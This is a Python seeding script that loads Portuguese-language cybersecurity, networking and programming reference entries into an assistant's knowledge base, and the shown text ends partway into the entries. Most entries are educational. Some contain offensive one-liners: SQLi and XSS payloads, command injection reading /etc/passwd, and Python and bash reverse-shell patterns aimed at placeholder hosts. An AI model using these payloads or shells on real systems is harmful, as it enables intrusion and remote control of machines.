"""
Tech & CyberSec Knowledge Base — torna o Condor um gênio em tecnologia e segurança.
Execute: python -m condor.memory.tech_seeder
"""
from __future__ import annotations
from condor.memory.db import MemoryDB
from condor.config import load_config
import logging

log = logging.getLogger("condor.tech_seeder")

# ─────────────────────────────────────────────────────────────────────────────
# CONHECIMENTO TÉCNICO
# ─────────────────────────────────────────────────────────────────────────────

TECH_KNOWLEDGE = [

# ══════════════════════════════════════════════════════════════════════════════
# FUNDAMENTOS DE CIBERSEGURANÇA
# ══════════════════════════════════════════════════════════════════════════════

("cyber:fundamentos",
"""Cibersegurança é a prática de proteger sistemas, redes e dados contra ataques, danos ou acesso não autorizado. Três pilares fundamentais — a tríade CIA: Confidencialidade (apenas pessoas autorizadas acessam os dados), Integridade (dados não são alterados de forma não autorizada) e Disponibilidade (sistemas funcionam quando necessário). Além desses, conceitos modernos adicionam Autenticidade (quem diz ser quem é?) e Não-repúdio (impossível negar que fez algo). Superfície de ataque (attack surface): soma de todos os pontos onde um atacante pode tentar entrar — cada API, porta aberta, usuário, dispositivo conectado é parte da superfície. Reduzir a superfície de ataque é um dos princípios mais eficazes de defesa. Defense in depth: múltiplas camadas de segurança — se uma falha, outra impede o ataque. Não existe segurança absoluta — existe gestão de risco. Threat modeling: processo de identificar o que proteger, de quem, quais são as ameaças realistas e como mitigar. Principle of least privilege: cada usuário, processo e sistema tem apenas as permissões mínimas necessárias para sua função."""),

("cyber:ataques_tipos",
"""Categorias de ataques cibernéticos: Ataques de rede (MITM — Man-in-the-Middle intercepta comunicação, Sniffing captura tráfego, Spoofing falsifica identidade de origem, DDoS sobrecarrega sistema com tráfego), Ataques a aplicações web (SQL Injection, XSS, CSRF, SSRF, Path Traversal, Command Injection), Ataques por engenharia social (phishing, spear phishing, vishing, smishing, pretexting, baiting), Ataques a senhas (brute force, dictionary attack, credential stuffing, rainbow table), Exploração de vulnerabilidades (buffer overflow, use-after-free, format string, heap spray), Ataques a criptografia (downgrade attack, padding oracle, birthday attack), Ataques físicos (evil maid, hardware keylogger, cold boot attack), Ataques a infraestrutura (DNS poisoning, BGP hijacking, ARP spoofing), Supply chain attacks (comprometer a cadeia de fornecimento de software/hardware). Todo ataque segue alguma variação do ciclo: reconhecimento → obtenção de acesso → escalada de privilégios → persistência → movimento lateral → exfiltração/impacto."""),

("cyber:malware",
"""Malware (malicious software) é qualquer software projetado para causar dano. Tipos: Vírus (anexa-se a programas legítimos, precisa de execução do host para se propagar), Worm (propaga-se autonomamente pela rede sem intervenção humana — WannaCry, Morris Worm), Trojan (se disfarça de software legítimo, abre backdoor), Ransomware (criptografa dados e exige resgate — REvil, LockBit, Conti, WannaCry; custo global bilhões/ano), Spyware (monitora e exfiltra dados sem consentimento), Adware (exibe propagandas, frequentemente com componente spyware), Rootkit (esconde-se no sistema operacional, difícil de detectar — altera kernel ou bootloader), Bootkit (infecta o bootloader, carrega antes do OS), Keylogger (registra teclado), RAT (Remote Access Trojan — controle remoto completo), Botnet (rede de máquinas infectadas controladas por C2 — Command and Control), Cryptominer (usa recursos da máquina para minerar criptomoeda sem consentimento), Fileless malware (vive só em memória RAM, sem arquivo em disco — muito difícil de detectar com antivírus tradicional). Análise de malware: estática (sem execução — strings, imports, hash, PE headers) e dinâmica (execução em sandbox — Cuckoo, Any.run, VirusTotal)."""),

("cyber:redes_segurança",
"""Segurança de redes é a base de tudo. Conceitos críticos: Firewall (filtra tráfego por regras — stateful vs stateless; NGFW — Next Generation com inspeção de aplicação), IDS (Intrusion Detection System — detecta, alerta) vs IPS (Intrusion Prevention System — detecta e bloqueia), DMZ (Demilitarized Zone — rede entre internet e rede interna para servidores públicos), VPN (Virtual Private Network — túnel criptografado; OpenVPN, WireGuard, IPSec), NAT (Network Address Translation — esconde IPs internos), Network segmentation (dividir rede em zonas com controles entre elas — zero trust model), WAF (Web Application Firewall — protege especificamente aplicações web), SIEM (Security Information and Event Management — coleta e correlaciona logs de toda a infraestrutura — Splunk, ELK Stack, QRadar). Protocolos vulneráveis por design: Telnet (texto claro — use SSH), FTP (texto claro — use SFTP/FTPS), HTTP (use HTTPS), SNMP v1/v2 (use v3), DNS (não criptografado — use DNS over HTTPS/TLS). Wireshark é a ferramenta padrão para análise de pacotes. tcpdump para captura em linha de comando. Nmap para descoberta de rede e scanning de portas."""),

("cyber:owasp_top10",
"""OWASP Top 10 é a lista das vulnerabilidades mais críticas em aplicações web, atualizada periodicamente. 2021: A01 Broken Access Control (falhas de controle de acesso — o mais comum; IDOR, privilege escalation), A02 Cryptographic Failures (criptografia fraca ou dados sensíveis em texto claro), A03 Injection (SQL, NoSQL, OS, LDAP injection — injeção de código em interpretadores), A04 Insecure Design (falhas de design, não de implementação), A05 Security Misconfiguration (configurações padrão, permissões excessivas, mensagens de erro com info demais), A06 Vulnerable and Outdated Components (dependências com CVEs conhecidos), A07 Authentication Failures (senhas fracas, sessões mal gerenciadas, sem MFA), A08 Software and Data Integrity Failures (deserialização insegura, supply chain — SolarWinds), A09 Security Logging and Monitoring Failures (sem logs, sem alertas — atacante persiste por meses), A10 SSRF (Server-Side Request Forgery — força servidor a fazer requisições internas). SQL Injection: ' OR '1'='1 — clássico; UNION SELECT, blind SQLi (booleana e tempo-based), out-of-band. XSS: refletido, armazenado (persistente — mais perigoso), DOM-based. CSRF: forçar usuário autenticado a executar ação não-intencional — mitigado com CSRF tokens."""),

("cyber:criptografia",
"""Criptografia é a base matemática da segurança digital. Simétrica: mesma chave para cifrar e decifrar. Rápida. Problema: como trocar a chave com segurança? AES (Advanced Encryption Standard): 128, 192 ou 256 bits — padrão ouro atual. Modos: ECB (inseguro — padrões visíveis), CBC, CTR, GCM (autenticado — preferido). 3DES obsoleto. Assimétrica (chave pública): par de chaves matematicamente ligadas — pública (todos podem ter) e privada (só o dono). O que cifra com uma, só a outra decifra. RSA: baseado em fatoração de números grandes. Lento — usado para troca de chaves e assinaturas, não para cifrar dados em massa. ECDSA/ECDH: curvas elípticas — mesma segurança com chaves menores. Ed25519 preferido para SSH. Troca de chaves Diffie-Hellman: duas partes chegam ao mesmo segredo sem nunca transmiti-lo. Forward secrecy: nova chave para cada sessão — comprometer a chave privada não compromete sessões passadas. Hash: função de mão única, tamanho fixo, avalanche effect (1 bit muda = hash completamente diferente). SHA-256, SHA-3: seguros. MD5, SHA-1: quebrados para criptografia, só para checksums não-críticos. bcrypt, scrypt, Argon2: hashing de senhas — lentos por design (custo aumentável), resistentes a GPU/ASIC. PBKDF2 aceitável mas inferior. Nunca armazenar senha em texto claro, nunca usar MD5/SHA para senha."""),

("cyber:pentest_metodologia",
"""Pentest (Penetration Test) é ataque autorizado para encontrar vulnerabilidades antes que atacantes reais o façam. Fases: 1) Reconhecimento/OSINT (passive recon — sem contato com alvo: Google dorks, Shodan, WHOIS, LinkedIn, Maltego, TheHarvester; active recon — com contato: nmap, banner grabbing), 2) Scanning e Enumeração (Nmap para portas/serviços/OS, Nessus/OpenVAS para vulnerabilidades, Nikto para web, Gobuster/ffuf para diretórios), 3) Exploração (Metasploit Framework — mais de 2000 exploits; exploits manuais, SQL map para SQLi, Burp Suite para web), 4) Pós-exploração (Meterpreter — shell avançado; escalada de privilégios: LinPEAS, WinPEAS; dumping de credenciais: mimikatz no Windows; movimento lateral; persistência), 5) Relatório (crítico — o que foi encontrado, risco, prova de conceito, remediação). Tipos de pentest: Black box (sem conhecimento prévio — simula atacante externo), Gray box (conhecimento parcial), White box (acesso total — mais completo). Metodologias: PTES (Penetration Testing Execution Standard), OWASP Testing Guide, NIST. Escopo e regras de engajamento são obrigatórios e legalmente vinculantes — pentest SEM autorização é crime."""),

("cyber:ferramentas",
"""Arsenal de ferramentas de segurança: Reconhecimento: Nmap ("nmap -sV -sC -O target" — versões, scripts padrão, OS detection), Masscan (mais rápido que nmap para varredura grande), Shodan (motor de busca de dispositivos expostos na internet — shodan.io), Amass (enumeração de subdomínios), theHarvester (e-mails, nomes, subdomínios), Maltego (OSINT visual). Exploração: Metasploit Framework (msfconsole — search, use, set, exploit), SQLmap (automatiza SQLi — sqlmap -u URL --dbs --dump), Burp Suite (proxy para web — Intercept, Repeater, Intruder, Scanner), BeEF (Browser Exploitation Framework — XSS avançado). Senhas: Hashcat (cracking GPU — masks, wordlists, rules; "hashcat -m 0 hash.txt rockyou.txt"), John the Ripper (CPU cracking), Hydra (brute force de serviços — SSH, FTP, HTTP), CrackMapExec (rede Windows), Responder (captura hashes NTLM na rede). Redes: Wireshark, tcpdump, Ettercap (MITM), Aircrack-ng (WiFi), Bettercap. Pós-exploração: Mimikatz (Windows passwords e tickets Kerberos), BloodHound (mapeamento Active Directory), Empire/Covenant (C2 frameworks). Forense: Autopsy, Volatility (memória RAM), FTK. Distribuições: Kali Linux (padrão pentest), Parrot OS, BlackArch. Plataformas de prática: HackTheBox, TryHackMe, VulnHub, PicoCTF."""),

("cyber:engenharia_social",
"""Engenharia social é a exploração da psicologia humana para obter informações ou acesso — frequentemente o vetor mais eficaz de ataque porque bypassa toda a tecnologia de segurança. Kevin Mitnick (ex-hacker mais famoso do mundo): "A vulnerabilidade humana é o maior vetor de ataque". Técnicas: Phishing (e-mail falso com link malicioso ou anexo — genérico para massa), Spear phishing (phishing altamente personalizado com informações específicas da vítima — CEO fraud, BEC — Business Email Compromise), Vishing (voz — ligação fingindo ser suporte técnico, banco, governo), Smishing (SMS phishing), Pretexting (criar cenário falso convincente — "sou do RH, preciso verificar seus dados"), Baiting (USB com malware em lugar público), Quid pro quo ("te dou algo em troca de sua senha"), Tailgating (seguir alguém por porta controlada), Watering hole (infectar site que a vítima frequenta). Defesa: treinamento de conscientização, MFA (mesmo com senha comprometida bloqueia), verificação fora de banda (ligar de volta no número oficial), cultura de segurança onde reportar suspeita é valorizado. A maioria dos APTs começa com engenharia social."""),

("cyber:web_hacking",
"""Web hacking é a área com mais oportunidades para iniciantes e mais impacto. SQL Injection: inserir SQL em campos de entrada. Payload básico: ' OR 1=1-- ; UNION SELECT null,username,password FROM users--. SQLmap automatiza. Blind SQLi (sem output direto): baseada em booleano ou tempo (SLEEP(5)). XSS (Cross-Site Scripting): injetar JavaScript no contexto de outro usuário. Refletido: payload na URL reflete de volta; Armazenado: payload persiste no banco (comentários, perfis). Payload básico: <script>alert(1)</script> ou <img src=x onerror=alert(1)>. Exploração: roubo de cookies (document.cookie), keylogging, redirecionamento, BeEF. CSRF: forçar usuário a fazer requisição. Formulário oculto numa página maliciosa envia requisição autenticada do usuário. Mitigado por CSRF token ou SameSite cookie. SSRF: servidor faz requisição para destino controlado pelo atacante. Explora metadados de cloud (169.254.169.254 na AWS), serviços internos, arquivos locais. IDOR (Insecure Direct Object Reference): mudar /api/user/1234 para /api/user/1235 acessa conta alheia. LFI (Local File Inclusion): incluir arquivos locais — /etc/passwd, ../../etc/shadow. Path traversal: ../../../etc/passwd. Command injection: ; ls -la, | cat /etc/passwd. Ferramentas: Burp Suite (essencial), OWASP ZAP (open source), ffuf/gobuster (fuzzing), wfuzz."""),

("cyber:linux_segurança",
"""Linux é o sistema operacional da segurança ofensiva e defensiva. Comandos essenciais para segurança: netstat -tulpn / ss -tulpn (portas abertas), ps aux (processos), lsof -i (arquivos abertos/conexões), who / w (usuários logados), last (histórico de logins), cat /etc/passwd e /etc/shadow (usuários e hashes), find / -perm -4000 2>/dev/null (binários SUID — escalada de privilégio), crontab -l (tarefas agendadas), iptables -L (regras de firewall), /var/log/ (logs do sistema), strace (rastrear syscalls), strings (extrair strings de binários), file (identificar tipo de arquivo). Escalada de privilégios: SUID/SGID abusáveis (GTFOBins — gtfobins.github.io), sudo -l (comandos sudo disponíveis), PATH hijacking, LD_PRELOAD, kernel exploits (ExploitDB, searchsploit), serviços rodando como root, writable /etc/passwd, weak file permissions, cron jobs com scripts writable. Hardening Linux: minimizar software instalado, desabilitar serviços desnecessários, configurar firewall (ufw/iptables), fail2ban (bloqueia brute force), AppArmor/SELinux (mandatory access control), audit logs (auditd), atualizações automáticas de segurança, SSH hardening (PasswordAuthentication no, PermitRootLogin no, Protocol 2, chave Ed25519)."""),

("cyber:windows_segurança",
"""Windows é o alvo mais comum em ambientes corporativos — entender sua segurança é essencial. Active Directory (AD): sistema de autenticação/autorização centralizado da Microsoft. Dominada pelo AD, 90% das empresas Fortune 500 usam. Kerberos: protocolo de autenticação do AD. Tickets: TGT (Ticket Granting Ticket) obtido com senha, TGS (Service Ticket) para serviços específicos. Ataques: Pass-the-Hash (usar hash NTLM diretamente), Pass-the-Ticket (roubar ticket Kerberos), Golden Ticket (forjar TGT com hash do KRBTGT — persistência máxima), Silver Ticket (forjar TGS para serviço específico), Kerberoasting (solicitar TGS de contas de serviço e crackear offline), AS-REP Roasting (contas sem pré-autenticação — hash direto). BloodHound: mapeamento visual de AD, encontra caminho de usuário qualquer para Domain Admin. Mimikatz: extrai hashes, senhas em memória, tickets. Ferramentas de escalada: WinPEAS, PowerUp, Sherlock. PowerShell para pentest: Invoke-Mimikatz, PowerView, PowerSploit. Defesa: Credential Guard, Windows Defender Credential Guard, Protected Users group, LAPS (Local Admin Password Solution), ATA/Defender for Identity, Privileged Access Workstations (PAW)."""),

("cyber:cve_exploits",
"""CVE (Common Vulnerabilities and Exposures): sistema de identificação de vulnerabilidades — CVE-AAAA-NNNNN. CVSS (Common Vulnerability Scoring System): pontuação de severidade 0-10 (Critical: 9.0-10.0, High: 7.0-8.9, Medium: 4.0-6.9, Low: 0.1-3.9). NVD (National Vulnerability Database) e MITRE mantêm o CVE. Exploit-DB (exploit-db.com): banco de dados público de exploits. SearchSploit: ferramenta CLI para buscar exploit-db offline. 0-day: vulnerabilidade sem patch — extremamente valiosa (mercado de 0-day para iOS pode chegar a U$2.5 milhões). 1-day: exploit publicado antes do patch ser amplamente aplicado — janela crítica. Patch Tuesday (Microsoft): segunda terça de cada mês — patches mensais. Metasploit: módulos organizados por CVE, plataforma, tipo. APT (Advanced Persistent Threat): grupos estatais ou patrocinados por estados com recursos ilimitados — APT28 (Fancy Bear — Rússia), APT41 (China), Lazarus Group (Coreia do Norte). Grupos de ransomware: LockBit, ALPHV/BlackCat, REvil (desapareceu). Bug bounty: programas legais que pagam por vulnerabilidades — HackerOne, Bugcrowd. Meta paga até U$300k, Google até U$250k, Microsoft até U$250k."""),

("cyber:forense",
"""Forense digital é a ciência de coletar, preservar, analisar e apresentar evidências digitais de forma legalmente admissível. Princípio fundamental: preserve antes de analisar — a coleta altera evidências. Chain of custody (cadeia de custódia): documentar quem teve acesso às evidências, quando e por quê. Write blocker: dispositivo hardware que previne qualquer escrita na mídia sendo analisada. Imagem forense: cópia bit-a-bit da mídia (dd, FTK Imager, dc3dd). Hash da imagem (MD5/SHA256) deve ser idêntico ao do original. Tipos de evidência: Disk forensics (sistema de arquivos, arquivos deletados — slack space, unallocated space), Memory forensics (RAM — processos, conexões de rede, senhas em memória — Volatility Framework), Network forensics (pcap — Wireshark), Log analysis, Mobile forensics. Ferramentas: Autopsy (GUI para análise de disco), Volatility 3 (memória — "vol.py -f mem.raw windows.pslist"), Sleuth Kit, Cellebrite (mobile), FTK. Artefatos Windows importantes: Registry (NTUSER.DAT, SAM, SYSTEM), Prefetch, Event Logs, LNK files, $MFT (Master File Table), ShellBags, Browser history. Linux: /var/log/, /proc/, .bash_history, /tmp/. Análise de malware: VirusTotal, Cuckoo Sandbox, Any.run, Hybrid Analysis."""),

("cyber:red_blue_purple",
"""Red Team: equipe ofensiva que simula atacantes reais — objetivo é comprometer o alvo sem restrições de metodologia, usando TTPs (Tactics, Techniques, Procedures) realistas. Vai além do pentest tradicional — inclui engenharia social, ataques físicos, operações longas com persistência. Relatório foca em impacto de negócio. Blue Team: equipe defensiva — monitoramento (SIEM, EDR), resposta a incidentes, threat hunting, hardening, análise de logs. SOC (Security Operations Center): equipe/estrutura que opera 24/7 monitorando. Purple Team: colaboração entre Red e Blue — Red ataca, Blue defende, ambos aprendem em tempo real — máxima transferência de conhecimento. MITRE ATT&CK Framework: base de conhecimento das TTPs usadas por atacantes reais, organizada por táticas (objetivo) e técnicas (como). Essencial para Red Team planejar ataques realistas e Blue Team mapear cobertura de detecção. Cadeia de ataque (Cyber Kill Chain — Lockheed Martin): Reconhecimento → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives. Incident Response (NIST): Preparação → Detecção/Análise → Contenção → Erradicação → Recuperação → Pós-incidente. DFIR (Digital Forensics and Incident Response)."""),

("cyber:wifi_segurança",
"""Segurança WiFi é crítica e frequentemente negligenciada. Protocolos: WEP (quebrado em minutos — nunca usar), WPA (melhor que WEP mas vulnerável ao ataque TKIP), WPA2 (padrão atual; vulnerável ao KRACK se não atualizado), WPA3 (mais recente — resistente a ataques de dicionário offline com SAE). Ataques WiFi: Handshake capture (4-way handshake WPA2 — capturado, crackado offline com hashcat + rockyou.txt), PMKID attack (não precisa aguardar cliente conectar — mais eficiente), Evil Twin (AP falso com mesmo nome — captura credenciais ou faz MITM), Deauth attack (desconectar clientes — 802.11 management frames não são autenticados no WPA2), WPS PIN attack (WPS pin brute force — Reaver), Karma attack (responde a qualquer probe request). Ferramentas: Aircrack-ng (suite completa — airmon-ng, airodump-ng, aireplay-ng, aircrack-ng), Wifite (automatiza), hcxdumptool (PMKID). Modo monitor: colocar placa WiFi em modo passivo que captura todo tráfego. Defesa: WPA3 ou WPA2 com senha longa/aleatória, desabilitar WPS, segmentar rede de convidados, 802.1X (autenticação por certificado em ambientes corporativos)."""),

("cyber:cloud_segurança",
"""Cloud security tem desafios únicos — modelo de responsabilidade compartilhada: provedor cuida da infraestrutura, cliente cuida do que coloca nela. AWS: IAM (Identity and Access Management — o mais crítico; least privilege; nunca usar root), Security Groups (firewall de instância), NACLs (firewall de subnet), KMS (gestão de chaves), CloudTrail (auditoria de API calls), GuardDuty (threat detection), Config (compliance), VPC (rede isolada). Erros comuns AWS: bucket S3 público (bilhões de dados expostos assim), credenciais hardcoded no código/git, políticas IAM overpermissive ("Action: *" é crime), metadata endpoint exposto (169.254.169.254 — credentials do IAM role), Security Groups 0.0.0.0/0 em portas críticas. Azure tem equivalentes: Azure AD, NSG, Key Vault, Sentinel, Defender. CSPM (Cloud Security Posture Management): ferramentas que detectam misconfigurações — Prisma Cloud, Wiz, Orca. Container security: imagens com vulnerabilidades (Trivy, Snyk para scan), runtime security (Falco), namespaces e RBAC no Kubernetes, secrets não devem estar em variáveis de ambiente ou YAML direto (use Vault ou Secrets Manager). DevSecOps: shift-left — integrar segurança no pipeline de CI/CD, não depois."""),

("cyber:criptografia_avancada",
"""Criptografia avançada que todo profissional de segurança deve entender: TLS/HTTPS: TLS 1.3 é o padrão atual — forward secrecy obrigatório, cifras mais fracas removidas. Handshake: Client Hello → Server Hello + Certificado → Key Exchange → Application Data. Certificados X.509: assinados por CAs (Certificate Authorities). PKI (Public Key Infrastructure): hierarquia de confiança — Root CA → Intermediate CA → End-entity cert. Certificate Transparency: logs públicos de todos os certificados emitidos (crt.sh). JWT (JSON Web Token): header.payload.signature — signature valida integridade. Erros comuns: algoritmo "none" aceito, chave fraca, secret no client-side. OAuth 2.0 e OpenID Connect: autorização e autenticação. Fluxos: Authorization Code (mais seguro), Implicit (deprecated), Client Credentials. Ataques: token hijacking, open redirector, PKCE bypass. Steganografia: ocultar dados dentro de imagens/áudio — não é criptografia (não confundir). zsteg, StegSolve, binwalk para detectar. Homomorfismo: criptografia que permite computar sobre dados cifrados sem decifrar — revolucionário para privacidade em cloud. PGP/GPG: assimetria para e-mail — chave pública para cifrar, privada para decifrar e assinar. Quantum computing threat: RSA e ECDSA serão quebrados por computadores quânticos suficientemente grandes — Post-Quantum Cryptography (CRYSTALS-Kyber, Dilithium) está sendo padronizado pelo NIST."""),

("cyber:osint",
"""OSINT (Open Source Intelligence) é inteligência coletada de fontes públicas — legal, poderosa e subestimada. Google Dorks: operadores avançados de busca para encontrar informações expostas. site:dominio.com busca só no site; filetype:pdf encontra documentos; inurl:admin encontra painéis; intitle:"index of" encontra diretórios abertos; "password" filetype:env encontra arquivos de configuração. Shodan: motor de busca para dispositivos conectados à internet — câmeras, roteadores, servidores industriais (SCADA/ICS), bancos de dados expostos (MongoDB, Elasticsearch). Query: port:27017 "MongoDB" country:BR. Censys, Fofa são alternativas. theHarvester: coleta e-mails, subdomínios, IPs, nomes de hospeagem de fontes públicas. Amass, Subfinder, Assetfinder: enumeração de subdomínios — encontra ativos que a empresa nem sabe que tem. WHOIS: registro de domínios — dono, contatos, registrar, datas. Shodan History: histórico de como o IP estava configurado no passado. GitHub Dorks: buscar no código-fonte público — credenciais, tokens, chaves API esquecidos. Trufflehog, GitLeaks: varrem repositórios git por segredos. Have I Been Pwned (haveibeenpwned.com): verificar se e-mail está em vazamentos. Maltego: ferramenta visual de OSINT que mapeia relações entre entidades. BeVigil, BBOT: OSINT automatizado. LinkedIn, Facebook, Instagram: perfis profissionais revelam tecnologias usadas, organigramas, nomes de funcionários (para spear phishing)."""),

("cyber:lgpd_compliance",
"""LGPD (Lei Geral de Proteção de Dados Pessoais — Lei 13.709/2018) é a lei brasileira de proteção de dados, inspirada no GDPR europeu. Vigência: 2020 (lei), 2021 (sanções). ANPD (Autoridade Nacional de Proteção de Dados): órgão regulador. Conceitos-chave: Dado pessoal (qualquer dado que identifique ou possa identificar uma pessoa física), Dado sensível (origem racial/étnica, religião, saúde, genética, biometria, vida sexual, político-partidário — tratamento mais restrito), Titular (a pessoa a quem os dados pertencem), Controlador (quem decide o tratamento), Operador (quem executa o tratamento a serviço do controlador), DPO/ENCARREGADO (responsável pela proteção de dados — pode ser pessoa física, jurídica ou departamento). Bases legais para tratamento: consentimento (livre, informado, inequívoco), cumprimento de obrigação legal, execução de contrato, interesse legítimo, proteção da vida, tutela da saúde, interesse público. Direitos do titular: acesso, correção, anonimização, portabilidade, eliminação, informação sobre compartilhamento, revogação de consentimento, revisão de decisão automatizada. Sanções: advertência, multa até 2% do faturamento (limite R$50M por infração), publicização da infração, bloqueio/eliminação dos dados. GDPR europeu: multas até 4% do faturamento global. ISO 27001: norma de SGSI (Sistema de Gestão de Segurança da Informação) — certificação internacional."""),

("cyber:ctf",
"""CTF (Capture The Flag) é competição de segurança onde participantes resolvem desafios para encontrar "flags" (strings secretas). Modalidades: Jeopardy (categorias independentes — Web, Crypto, Pwn/Binary, Reversing, Forensics, OSINT, Misc), Attack-Defense (times atacam e defendem infraestrutura simultaneamente). Categorias: Web (SQLi, XSS, SSTI, SSRF, deserialization), Crypto (quebrar cifras, RSA fraco, XOR, oracle attacks), Pwn (exploração de binários — buffer overflow, ret2libc, ROP chains, format string), Reversing (engenharia reversa de binários — Ghidra, IDA Pro, radare2, Binary Ninja), Forensics (análise de pcap, imagens de disco, esteganografia, memory forensics), OSINT, Misc. Ferramentas essenciais CTF: pwntools (Python para exploração de binários), CyberChef (criptografia/codificação no browser), ROPgadget/pwndbg (ROP chains), GDB com PEDA/pwndbg (debugging), Ghidra/IDA (disassembler gratuito/pago), binwalk (análise de firmware), zsteg/steghide (esteganografia). Plataformas: picoCTF (iniciantes), HackTheBox, TryHackMe, CTFtime.org (calendário de competições), pwn.college (binário). CTF é a melhor forma de aprender segurança na prática — ambiente legal, desafiador, comunidade ativa."""),

# ══════════════════════════════════════════════════════════════════════════════
# REDES E PROTOCOLOS
# ══════════════════════════════════════════════════════════════════════════════

("redes:modelo_osi",
"""Modelo OSI (Open Systems Interconnection): 7 camadas que descrevem como dados se movem pela rede. Camada 7 — Aplicação: protocolos que o usuário vê — HTTP, HTTPS, DNS, FTP, SMTP, SSH, Telnet, DHCP, SNMP. Camada 6 — Apresentação: formatação, compressão, criptografia (TLS vive aqui conceitualmente, embora implementado na 7). Camada 5 — Sessão: gerencia sessões de comunicação. Camada 4 — Transporte: TCP (confiável, orientado a conexão, 3-way handshake: SYN → SYN-ACK → ACK; controle de fluxo e congestionamento) vs UDP (não confiável, sem conexão, rápido — DNS, streaming, games, VoIP). Portas: 0-1023 well-known, 1024-49151 registered, 49152-65535 ephemeral. Camada 3 — Rede: IP (roteamento, endereçamento lógico), ICMP (ping, traceroute), ARP (resolve IP para MAC). IPv4 vs IPv6. Sub-redes: CIDR /24 = 256 IPs, /16 = 65536 IPs. Camada 2 — Enlace: MAC addresses, Ethernet, switches, VLANs. Camada 1 — Física: bits, cabos, sinais elétricos/ópticos. TCP/IP stack na prática: Application Layer (7+6+5 do OSI), Transport (4), Internet (3), Network Access (2+1). Saber qual camada está sendo atacada determina a defesa."""),

("redes:protocolos_criticos",
"""Protocolos que todo especialista de segurança precisa dominar: DNS (Domain Name System): porta 53 UDP/TCP. Resolve nomes para IPs. Hierarquia: Root → TLD (.com, .br) → Authoritative. Ataques: DNS poisoning/spoofing (forjar resposta), DNS tunneling (exfiltrar dados via DNS — Iodine, dnscat), DNS amplification (DDoS — pequena query, grande resposta). Defesas: DNSSEC, DNS over HTTPS (DoH), DNS over TLS (DoT), monitorar queries volumosas. HTTP/HTTPS: HyperText Transfer Protocol. Métodos: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS. Cabeçalhos de segurança críticos: Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security (HSTS), Referrer-Policy. Cookies: HttpOnly (não acessível por JS), Secure (só HTTPS), SameSite (proteção CSRF). SMTP (25/587/465): e-mail. SPF, DKIM, DMARC: mecanismos de autenticação de e-mail que reduzem phishing. SSH (22): protocolo seguro para acesso remoto. Substituição do Telnet. Chaves Ed25519 preferidas. SSH tunneling: port forwarding local/remoto (pivoting em pentest). SMB (445): file sharing Windows. EternalBlue (MS17-010): exploração usada pelo WannaCry. LDAP (389/636): Active Directory. RDP (3389): Remote Desktop — frequentemente exposto e atacado."""),

("redes:tcpip_profundo",
"""TCP/IP profundo para segurança: IP Addresses: IPv4 (32 bits, esgotado), IPv6 (128 bits, adoção crescente). RFC1918 — espaços privados: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. Loopback: 127.0.0.1 (localhost). APIPA: 169.254.0.0/16 (auto-configured sem DHCP). Routing: tabela de roteamento, default gateway, OSPF, BGP (protocolo de roteamento da internet — BGP hijacking é ataque grave). NAT (Network Address Translation): permite que muitos IPs privados compartilhem um IP público. PAT (Port Address Translation): NAT com portas. Firewall rules: stateful (rastreia conexões estabelecidas), stateless (filtra cada pacote independentemente). iptables: ferramenta de firewall Linux. iptables -A INPUT -p tcp --dport 22 -j ACCEPT; -A INPUT -j DROP (política de negação padrão). nftables: substituto moderno do iptables. ufw: interface simplificada. TCP flags: SYN (iniciar conexão), ACK (confirmar), RST (resetar), FIN (finalizar), PSH (prioridade), URG (urgente). Nmap usa combinações de flags para scanning stealth: -sS (SYN scan — half-open, mais furtivo), -sU (UDP), -sN -sF -sX (Null, FIN, Xmas — bypassam alguns firewalls)."""),

# ══════════════════════════════════════════════════════════════════════════════
# PROGRAMAÇÃO E DESENVOLVIMENTO
# ══════════════════════════════════════════════════════════════════════════════

("programacao:python_segurança",
"""Python é a linguagem dominante em segurança cibernética — scripting de automação, exploits, ferramentas. Bibliotecas essenciais: socket (comunicação de rede de baixo nível — criar servidores, clientes, raw sockets), requests (HTTP — GET, POST, sessões, headers customizados), scapy (criação e manipulação de pacotes de rede — forjar qualquer protocolo), paramiko (SSH client/server em Python), pwntools (CTF e exploração de binários — GDB integration, ROP, shellcode), cryptography / PyCryptodome (AES, RSA, hashing), BeautifulSoup / lxml (parsing HTML para web scraping), Selenium / Playwright (automação de browser), impacket (protocolos Windows — SMB, LDAP, Kerberos). Scripts úteis: Port scanner em 10 linhas com socket, brute forcer HTTP com requests, packet sniffer com scapy, keylogger com pynput, reverse shell com socket + subprocess. Padrão de reverse shell Python: import socket,subprocess,os; s=socket.socket(); s.connect(("IP",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]). Obfuscação: base64, exec(compile()), importlib — comum em malware Python. Virtual environments, requirements.txt, boas práticas de código seguro."""),

("programacao:bash_scripting",
"""Bash é essencial para automação em Linux e para pentest. Estruturas básicas: variáveis ($var, ${var}), argumentos ($1, $2, $@, $#), condicionais (if [ condição ]; then ... fi), loops (for i in lista; do ... done / while condição; do ... done), funções (nome() { corpo; }). Operadores de comparação strings: = !=; números: -eq -ne -lt -gt -le -ge; arquivos: -f (regular file), -d (directory), -r -w -x (permissões), -e (existe). Redireção: > (stdout, sobrescreve), >> (append), 2> (stderr), 2>&1 (stderr para stdout), < (stdin). Pipes: | encadeia comandos. Process substitution: <(cmd) para usar output como arquivo. Here documents: cat << EOF ... EOF. Útil para pentest: one-liners que automatizam reconhecimento, port scanners básicos com /dev/tcp, loop sobre wordlist para brute force. Bash one-liner port scan: for p in {1..1000}; do (echo >/dev/tcp/host/$p) 2>/dev/null && echo "$p open"; done. Bash reverse shell: bash -i >& /dev/tcp/IP/PORT 0>&1. Wildcards e globbing, expressões regulares com grep/sed/awk. Cron jobs para automação periódica. Variáveis de ambiente e como são exploradas (PATH hijacking, LD_PRELOAD)."""),

("programacao:web_dev_segurança",
